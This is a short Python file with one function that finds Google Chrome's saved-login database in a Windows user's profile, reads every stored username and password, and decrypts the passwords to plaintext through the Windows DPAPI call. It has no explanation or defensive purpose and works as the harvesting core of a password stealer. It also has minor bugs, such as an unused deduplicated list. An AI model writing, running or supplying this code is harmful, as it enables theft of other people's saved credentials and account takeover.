import os
import sqlite3
import win32crypt

def retrieve_chrome():
    datapath = os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
    dbfile = os.path.join(datapath, 'Login Data')
    if not os.path.exists(datapath):
        return (None, None)
    db = sqlite3.connect(dbfile)
    dbcursor = db.cursor()
    selectPass = "SELECT username_value, password_value FROM logins"
    dbcursor.execute(selectPass)
    logins = dbcursor.fetchall()
    acctlist = []
    passlist = []
    for user_name, pwd in logins:
        if len(user_name) > 0:
            acctlist.append(user_name.lower())
        pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)
        pwd = pwd[1].decode()
        if len(pwd) > 0:
            passlist.append(pwd)
            
    dedupAccList = []
    for item in acctlist:
        if item not in dedupAccList:
            dedupAccList.append(item)
    
    return (acctlist, passlist)